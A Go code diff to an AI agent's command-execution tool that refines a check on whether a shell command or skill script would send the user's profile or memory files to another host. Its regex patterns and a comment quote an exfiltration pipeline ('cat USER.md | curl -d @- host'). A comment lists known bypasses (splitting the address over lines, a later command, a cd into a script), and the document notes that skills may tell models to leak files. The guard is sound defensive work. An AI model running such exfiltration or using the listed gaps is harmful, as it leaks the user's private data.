@@ -25,9 +25,10 @@ var networkClientPattern = regexp.MustCompile(
 var personalFilePattern = regexp.MustCompile(
 	`(?i)(?:^|[\s'"=@/\\(,:])(?:(?:user|soul|memory)\.md\b|(?:memory|sessions)[/\\])`)
 
-// downloadTargetPattern finds where a command writes what it downloads: a
-// personal file there is written, not sent.
-var downloadTargetPattern = regexp.MustCompile(`(?:>>?|(?:^|\s)(?:-o|-O|--output|--output-document)(?:=|\s+))\s*\S+`)
+// writtenFilePattern finds where a command writes what it fetches: a personal
+// file there is written, not sent.
+var writtenFilePattern = regexp.MustCompile(
+	`(?:>>?|(?:^|\s)(?:-o|-O|--output|--output-document)(?:=|\s+)|\btee\s+(?:-a\s+)?)\s*\S+`)
 
 // scriptPathPattern finds the script files a command hands to an interpreter.
 var scriptPathPattern = regexp.MustCompile(`[^\s'"<>|;&()]+\.(?:py|sh|bash|js|mjs|cjs|ts|rb|pl|php)\b`)
@@ -37,42 +38,94 @@ const (
 	maxScannedScriptBytes = 64 << 10
 )
 
-// personalFilesSentTo returns where a command, or a script it runs, would
-// hand the person's profile or memory files, or "". A skill or a file that
-// asks for it is not the person asking, and some models follow a skill step
-// by step.
-// shortcut: it reads the command and the scripts it names, so code that builds the path or the address
-// at run time, or a script reached after a cd, passes; upgrade to a network policy for skill scripts then.
+// personalFilesSentTo returns where a command would hand the person's profile
+// or memory files, or "". A skill or a file that asks for it is not the person
+// asking, and some models follow a skill step by step. A file counts as sent
+// only when the same command, or the skill script it runs, reaches another
+// host and does not merely write the file.
+// shortcut: it reads each command on its own and only the scripts of skills, so code that splits the
+// address and the file over lines, a script reached after a cd, or a copy sent by a later command passes;
+// upgrade to a network policy for skill scripts then.
 func (t *ExecTool) personalFilesSentTo(command, cwd string) string {
-	text := command + t.scriptsRun(command, cwd)
-	destination := ""
-	if raw := remoteURLPattern.FindString(text); raw != "" {
-		destination = raw
-		if parsed, err := url.Parse(raw); err == nil && parsed.Hostname() != "" {
-			destination = parsed.Hostname()
+	for _, unit := range commandUnits(command) {
+		text := unit + t.skillScriptsRun(unit, cwd)
+		destination := remoteDestination(text)
+		sent := writtenFilePattern.ReplaceAllString(remoteURLPattern.ReplaceAllString(text, " "), " ")
+		if destination != "" && personalFilePattern.MatchString(sent) {
+			return destination
 		}
-	} else if networkClientPattern.MatchString(text) {
-		destination = "another host"
 	}
-	sent := downloadTargetPattern.ReplaceAllString(remoteURLPattern.ReplaceAllString(text, " "), " ")
-	if destination == "" || !personalFilePattern.MatchString(sent) {
-		return ""
-	}
-	return destination
+	return ""
 }
 
-// scriptsRun is the text of the regular files a command names as scripts, so
-// a script that names the files and the address itself is read like the
-// command. Under a workspace restriction it reads only scripts inside it: the
-// refusal names a host, and one from a file the agent cannot read must not leak.
-func (t *ExecTool) scriptsRun(command, cwd string) string {
+func remoteDestination(text string) string {
+	if raw := remoteURLPattern.FindString(text); raw != "" {
+		if parsed, err := url.Parse(raw); err == nil && parsed.Hostname() != "" {
+			return parsed.Hostname()
+		}
+		return raw
+	}
+	if networkClientPattern.MatchString(text) {
+		return "another host"
+	}
+	return ""
+}
+
+// commandUnits splits a command where one command ends and the next begins:
+// an unquoted `;`, `&&` or `||`, or a new line. A pipeline stays whole, since
+// `cat USER.md | curl -d @- host` sends what the first stage reads.
+func commandUnits(command string) []string {
+	var units []string
+	var unit strings.Builder
+	runes := []rune(command)
+	quote := rune(0)
+	cut := func() {
+		units = append(units, unit.String())
+		unit.Reset()
+	}
+	for i := 0; i < len(runes); i++ {
+		r := runes[i]
+		switch {
+		case r == '\n':
+			quote = 0
+			cut()
+			continue
+		case quote != 0:
+			if r == quote {
+				quote = 0
+			}
+		case r == '\'' || r == '"':
+			quote = r
+		case r == ';':
+			cut()
+			continue
+		case (r == '&' || r == '|') && i+1 < len(runes) && runes[i+1] == r:
+			cut()
+			i++
+			continue
+		}
+		unit.WriteRune(r)
+	}
+	cut()
+	return units
+}
+
+// skillScriptsRun is the text of the skill scripts a command runs, so a skill
+// script that names the files and the address itself is read like the command.
+// Only skills come from someone else: the assistant's own scripts, a cron job
+// that saves fetched data to memory among them, are not read.
+func (t *ExecTool) skillScriptsRun(command, cwd string) string {
+	if t.workingDir == "" {
+		return ""
+	}
+	skills := filepath.Join(t.workingDir, "skills")
 	var text strings.Builder
 	for _, name := range scriptPathPattern.FindAllString(command, maxScannedScripts) {
 		path := name
 		if !filepath.IsAbs(path) {
 			path = filepath.Join(cwd, path)
 		}
-		if t.restrictToWorkspace && t.workingDir != "" && !insideWorkspace(path, t.workingDir) {
+		if !insideDir(path, skills) {
 			continue
 		}
 		if info, err := os.Stat(path); err != nil || !info.Mode().IsRegular() {
@@ -90,12 +143,12 @@ func (t *ExecTool) scriptsRun(command, cwd string) string {
 	return text.String()
 }
 
-func insideWorkspace(path, workspace string) bool {
+func insideDir(path, dir string) bool {
 	resolved, err := filepath.EvalSymlinks(path)
 	if err != nil {
 		return false
 	}
-	root, err := filepath.EvalSymlinks(workspace)
+	root, err := filepath.EvalSymlinks(dir)
 	if err != nil {
 		return false
 	}
